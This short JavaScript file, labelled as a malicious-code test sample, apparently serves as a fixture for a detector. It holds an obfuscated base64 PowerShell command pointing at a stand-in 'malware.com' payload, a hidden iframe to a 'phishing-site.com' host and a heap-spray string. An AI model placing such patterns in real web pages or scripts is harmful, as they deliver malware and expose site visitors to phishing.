// Test Malicious JS
var x = eval("atob('cG93ZXJzaGVsbC5leGUgLWMgImh0dHA6Ly9tYWx3YXJlLmNvbS9wYXlsb2FkLmV4ZSI=')");
document.write("<iframe src='http://phishing-site.com'></iframe>");
unescape("%u4141%u4141");
